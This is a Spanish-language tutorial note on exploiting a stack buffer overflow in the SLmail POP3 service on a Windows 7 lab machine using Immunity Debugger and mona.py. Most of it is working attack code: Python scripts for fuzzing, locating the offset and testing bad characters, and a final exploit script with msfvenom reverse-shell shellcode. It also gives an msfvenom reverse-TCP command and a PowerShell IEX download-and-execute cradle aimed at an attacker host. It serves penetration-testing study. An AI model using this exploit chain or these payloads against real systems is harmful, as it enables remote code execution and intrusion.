-----
- Tags: #practico #ejemplificación 
- -----

# Escenario 

### Para realizar un Buffer Overflow en una máquina con arquitectura de 32 bits, necesitamos un programa llamado [Immunity Debugger](https://www.immunityinc.com/products/debugger/) el cual es un depurador de 32 bits para windows. Por otro lado necesitaremos un script en python llamado [mona.py](https://github.com/corelan/mona) para automatizar y facilitar las búsquedas en el inmunity debugger, una vez descargado, este deberá ser movido a la ruta de **C:\\LocalFiles\\InmunityInc\\ImmunityDebugger\\PyCommands**. 

### Para practicar todo esto obviamente usamos una [iso de windows 7 premium](https://windows-7-home-premium.uptodown.com/windows). 

------

# Basic Buffer Overflow x86

### Para ejemplificar un caso de explotación de Buffer Overflow x86 BÁSICO se usara el windows 7 premium junto a un programa conocido por su vulnerabilidad BOF en un campo PASS el cual se llama *SLmail*. 

### Una vez que tengamos la aplicación desplegada, la misma nos abrirá en la maquina windows el puerto **110**, por lo que nos podríamos intentar conectar con **telnet** o **netcat** para intentar ingresar los campos necesarios (USER & PASS).

### Si nos conectamos (**telnet {ip} 110**) e ingresamos **USER dobliuw** y **PASS test** veremos que nos arroja un error por que las credenciales no son válidas, pero de momento el programa estaría funcionando. Si nos abrimos el **immunity debugger** en el windows *attacheando* la tarea del *slmail* podremos ver los registros, la pila, entre otras cosas.

### La idea es ingresar múltiples caracteres hasta producir un fallo en el programa debido a sobrescribir los valores de la pila y los registros. Una vez logrado el fallo en el mismo comenzamos con el trabajo para buscar el **offset**. Por lo que para todo este trabajo podemos realizar un script en python jugando con **sockets**.

```python
#!/usr/bin/python3 

import socket
import sys 

ip = "192.168.1.34"
port = 110

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Se crea una conexión el la variable s

    s.connect((ip, port)) # Nos conectamos a la ip y el puerto dado 

    banner = s.recv(1024) # Recibimos la respuesta de 1024 bytes 
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #Envíamos la string "USER dobliuw" en formato byte y "\r\n" es una manera de simular el ENTER
        response = s.recv(1024)
        print(response)
        s.send(b"PASS " + b"A"*5000 + b'\r\n') # Envíamos la string "PASS AAAAAAAAAA...." en formato byte, siendo el 5000 la cantidad de caracteres a probar hasta generar el fallo.
        s.close()


if __name__ == "__main__":
    bof()
```

### Una vez encontrado un número el cual ocasione un fallo, en este caso 5000, sabemos que al ingresar esta cantidad el programa corrompe debido a que el bufer asignado para la password es de un tamaño de caracteres menor a estos 5000, por lo que ahora hay que encontrar el **offset**.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 
# pattern_create.rb es un scrip en rubi el cual recibe una logitud de caracteres creando así un payload para envíar. 
```

### Una vez generada la cadena de bytes a enviar, simplemente tendríamos que mandarlo y ver el valor por el cual se sobrescribe el registro EIP, para luego hacer uso de otra herramienta para obtener la cantidad de caracteres previos antes de que el registro EIP se sobrescriba.

```bash
# Si el registro EIP marca "7A46317A" debemos ingresarlo junto a un 0x al principio 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
```

### Esta herramienta nos devuelve un número el cual nos indica la cantidad de caracteres previos a que se sobrescriba el valor del registro EIP. Pudiendo así saber exactamente cuando y como hacer para manipular este mismo a gusto. 

### Una vez conseguido el offset, podríamos actualizar el script: 

```python
#!/usr/bin/python3 

import socket
import sys 

ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"BBBB"
after_eip = b"C"*200

payload = b'PASS ' + before_eip + eip + after_eip

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #\r\n manera de simular ENTER
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()

```

### Agregando 4654 "A" las cuales sobrescribren y pausan el programa, los siguientes 4 caracteres "B" pertenecerían al registro EIP y posteriormente 200 caracteres "C" para ver como se sobrescribe (En este caso, el registro ESP) 

### De esta manera deberíamos generar un  **byte array**, es decir todas las combinaciones posibles de bytes para posteriormente detectar los **badchars**. 

### Esto lo haríamos con el **immunity debugger** ingresando *!mona* para abrir el script en python y posteriormente ingresar los comandos: 

- ### **!mona**
- ### **!mona config -set workingfolder C:\\Users\\{user}\\Desktop\\{new_dir_name}** (Esto para crear un directorio de trabajo en nuestro escritorio)
- ### **!mona bytearray -cpb "\\0x"** (Para crear un byte array excluyendo el null byte en el directorio de trabajo previamente creado)

### La intención de esto, es que con todo el **byte array** donde en el script previamente ingresamos 200 caracteres "C" para ver que caracteres no salen representados en el stack para a la hora de crear el shellcode evitar los **badchars**. 

### Una vez enviado el **byte array**:

```python
# code .....
before_eip = b"A"*offset
eip = b"BBBB"
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = b'PASS ' + before_eip + eip + after_eip
# ..... code
```

### Veremos en el **immunity debugger** donde se corrompe el payload, para que de esta manera podamos empezar a detectar los **badchars**, si bien podemos hacerlo manual viendo que caracteres corrompen el programa, lo podemos hacer con **mona.py**: 

- ### **!mona compare -a 0x{ESP_value} -f C:\\Users\\{user}\\Desktop\\{new_dir_name}\\bytearray.bin**

### Esto lo que hará sera crear un archivo **compare** en la misma carpeta de trabajo indicada con los *badchars*.  De esta manera podríamos ir creando el **byte array** excluyendo con mona los bytes que el programa no interpreta como **!mona bytearray -cpb "\\x00\\x{bad_char}"**.

### Una vez creado el **byte array** con los **badchars** excluidos, no deberíamos tener ningún problema a la hora de ejecutar nuestro shellcode a futuro. Por lo que en este caso toca encontrar el espacio den memoria que apunte al ESP ya que no podemos apuntar directamente a este y necesitamos apuntara a un registro en memoria que se encarge de realizar un salto al ESP.

## Creando el shellcode 

### Para crear el shellcode lo podemos hacer de manera manual o con herramientas como **msfvenom**.

### `msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.33 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread`

### En esta caso con el **-p** indicamos el *payload*, con **--plaform** claramente la *plataforma*, con **-a** la **arquitectura** (En este caso 32bits = x86), con **LHOST** nuestra *IP* de atacante a donde queremos recibir la conexión y con **LPORT** el *puerto*, con **-f** el *formato* (Python, C, etc.), con **-e** el *encoder* a usar (En caso de tener muchos badchars y usar el shikata_ga_nai aveces no podrá encodear todo de una manera optima, en esos caso es mejor no especificar un *-e* y dejar que msfvenom se encarge de aplicar el más optimo), con **-b** los *badchars* y el **EXITFUNC=thread** es para que a la hora de terminar la conexión con la consola interactiva no mate el proceso padre (El programa vulnerable a buffer overflow) para no crashear el programa, de esta manera creamos un hilo que a la hora de salir de la consola se mantenga el servicio inicial y solo se termine el nuevo proceso hijo que se abrirá. 

### Una vez creado el shellcode, solo tendríamos que encontrar un **OpCode** para que podamos apuntar al ESP donde esta nuestro shellcode.

### Para buscar el *OpCode* podríamos hacer uso de la herramienta *nasm_shell.rb* para entrar en modo interactivo :

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
# Una vez en modo interactivo escribimos los siguiente 
jmp ESP 
```

### Esto nos devolverá el **OpCode** de **jmp ESP** ( FFE4 = \\xFF\\xE4 ) el cual al no ser una dirección (Solo un OpCode) no debemos darle la vuelta como little endian.

### Una vez con este **OpCode** haciendo uso de mona con el comando **!mona modules** podremos ver los módulos que se usan en el programa donde tendremos que buscar uno que tenga las 4 primeras columnas en *FALSE* para buscar (**!mona find -s ""\\xFF\\xE4" -m {module_name}**) si existe el OpCode **JMP ESP** dentro del modulo, en caso de que existe, devolverá múltiples direcciones de memoria y seleccionaremos una (La cual no tiene que contener badchars). 
### En algunos casos puede ser que nos diga que se encontraron un total de *0 pointers*, en este caso podemos hacer uso en lugar de "find" de "findwild" (*!mona help findwild*) para buscar por instrucciones (*!mona findwild -s "JMP ESP"*)

### Ahora nuestro **EIP** tiene que valer esta dirección en memoria encontrada dentro de uno de los módulos donde existe el OpCode dentro en una dirección en particular, la cual copiamos y representamos en little endian o, si estamos en python, con la librería *struct* la función *pack*.

```python
#!/usr/bin/python3 

import socket
import sys 
from struct import pack 
ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4a358f) # "<L" para indicar que es littel endian (5f4a358f es una de las direcciones donde se encontro el OpCode JMP ESP del modulo seleccionado)
shellcode = (b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"
b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"
b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"
b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"
b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"
b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"
b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"
b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"
b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"
b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"
b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"
b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"
b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"
b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"
b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"
b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"
b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"
b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"
b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"
b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"
b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"
b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"
b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"
b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"
b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"
b"\x31")

payload = b'PASS ' + before_eip + eip + shellcode

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n')
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()

```

### Una vez que tengamos el espacio en memoria de donde se encontrará el OpCode, deberíamos verificar si esto es así, por lo que deberíamos agregar un breakpoint en el immunity debugger para verificar si en algún punto, en la ejecución del programa con nuestras cargas, el registro EIP vale la dirección de memoria ingresada. Si esto es así, el flujo de nuestro BOF va muy bien encaminado, solo faltaría un ultimo retoque. 

### Hasta el momento hayamos el **offset** para saber donde comenzamos a sobrescribir el **registro EIP** (Encargado de apuntar a la siguiente tarea a ejecutar ) para así posteriormente hallar un espacio en memoria que contenga el **OpCode** ( *JMP ESP* ) el cual es un OpCode que se encarga de hacer que el flujo del programa salte al **registro ESP** ( Encargado de la pila ) para poner esta dirección de memoria como valor del registro EIP, para cargar en la pila nuestro **shellcode** malicioso ( Creado ignorando los **badchars** hallados a partir del **bytearray** probado en el programa ) y como el EIP apunta al OpCode JMP ESP hacer que el flujo del programa salte a la pila (**stack**) donde esta nuestro **shellcode** (Instrucciones a bajo nivel).

###  El problema es que aveces no damos tiempo a que nuestro shellcode se ejecute ya que el procesador no llega a realizarlo en su tiempo, por lo que nos hace falta hacer uso de una de las técnicas que se suele usar en este caso como el uso de NOPs o el desplazamiento de la pila.

### Por lo que, si quisiéramos hacer uso de NOPs simplemente deberíamos representar el byte *\\x90* varías veces, como 16 o 32 antes del shellcode.  
### Por otro lado, si quisiéramos hacer uso del desplazamiento de la pila simplemente podríamos hacer otra vez uso de la herramienta de metasploit **nasm_shell.rb** 

```bash
# NOPs 
nops = b"\x90"*32

# STACK DISPLACEMENT

/usr/share/matasploit-framework/tools/exploit/nasm_shell.rb 
# Entramos en modo interactivo y tipeamos: 
sub esp,0x10
# Esto nos arroja un OpCode (83EC10) decrementa el valor del puntero de pila 10 bytes 
stack_displacement = b"\x83\xEC\x10"

```

### De esta manera habríamos explotado un [[Buffer Overflow]] en una arquitectura x86 (32 bits).

#### Script final: 
```python
#!/usr/bin/python3 

import socket
import sys 
from struct import pack 
ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4a358f)
shellcode = (b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"
b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"
b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"
b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"
b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"
b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"
b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"
b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"
b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"
b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"
b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"
b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"
b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"
b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"
b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"
b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"
b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"
b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"
b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"
b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"
b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"
b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"
b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"
b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"
b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"
b"\x31")

# USING NOPS 
#nops = b"\x90"*16

# USING STACK DISPLACEMENT 
stack_displacement = b"\x83\xEC\x10"

# USING NOPS 
#payload = b'PASS ' + before_eip + eip + nops + shellcode

# USING STACK DISPLACEMENT 
payload = b'PASS ' + before_eip + eip + stack_displacement + shellcode


def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #\r\n manera de simular ENTER
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()
```

### Como adicional, si quisiéramos ejecutar un comando en particular en lugar de entablar una de las [[Shells]] (**Reverse Shell**), podríamos usar otro payload con la herramienta **msfvenom**

### `msfvenom -p windows/exec CMD="{command}" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread`

### Por ejemplo el comando podría ser `powershell IEX(New-Object Net.WebClient).dowloadString('http://192.168.1.33:443/reverse.ps1')` para descargarnos un recurso en particular de nuestra url y posteriormente ejecutarlo con powershell, el script podría ser del [repositorio de github de nishang](https://github.com/samratashok/nishang).